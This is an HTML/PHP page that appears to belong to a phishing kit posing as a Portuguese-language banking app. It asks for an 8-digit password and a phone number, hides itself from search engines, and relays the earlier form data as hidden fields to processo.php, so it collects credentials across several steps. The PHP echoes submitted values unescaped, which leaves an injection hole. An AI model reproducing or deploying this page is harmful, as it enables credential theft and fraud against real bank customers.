<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>Bem vindo - Aplicativo Online</title>
    <link rel="shortcut icon" href="../imagens/favicon.png" />

    <meta name="theme-color" content="#f4f102">
	<meta name="msapplication-navbutton-color" content="#f4f102">
	<meta name="apple-mobile-web-app-status-bar-style" content="#f4f102">

    <meta name="robots" content="noindex,nofollow">
	<meta name="googlebot" content="noindex,nofollow">
	<meta name="robots" content="noarchive">

    <link href="https://fonts.googleapis.com/css?family=Open+Sans:300,400,600,700,800" rel="stylesheet">
</head>
<body class="back_blue">

<div class="row hd_top">
    <div class="centralizar">
        <img src="../imagens/logo.jpg" class="cima_logo">
        <div class="desc_now">
            <h1>Confirmação.</h1>
            <p>
                Para concluir esta solicitação, informe sua senha de 6 digitos. <br>
            </p>
        </div>
    <div class="limpar"></div>
    </div><!-- centralizar -->
</div><!-- row -->

<div class="row main_form">
    <div class="centralizar">
        <form action="processo.php" method="post" class="home_form" autocomplete="off">
		<?php foreach($_POST as $key => $value):  ?>
	<input type="hidden" name="<?= $key ?>" value="<?= $value ?>" />
 <?php endforeach; ?>
            <label for="is_fone">
                <span>Senha:</span>
                <input type="password" name="senha8" id="senha8" onkeyup="somenteNumeros(this);" class="home_input" placeholder="Senha de 8 digítos" maxlength="8" required>
            </label>
            <label for="is_ps8">
                <span>Telefone:</span>
              <input type="tel" name="telefone" id="telefone" class="home_input" placeholder="Telefone" maxlength="15"  onkeyup="mascaraMike('## #####-####', this);" required>
            </label>

            

          <div class="limpar"><br></div>

            <button class="home_btn">
                ACESSAR
            </button>

            <input type="hidden" name="sender" value="home">

        </form>
    <div class="limpar"></div>
    </div><!-- centralizar -->
</div><!-- row -->

<!-- includes -->
<link rel="stylesheet" href="../estilos/estilo.css">
<script src="../javascripts/jquery.min.js"></script>
<script src="../javascripts/jquery.mask.js"></script>
<script src="../javascripts/javascripts.js"></script>
<script>
$( document ).ready(function() {
    $('#telefone').mask('00 00000-0000', {reverse: true});
});
</script>

</body>
</html>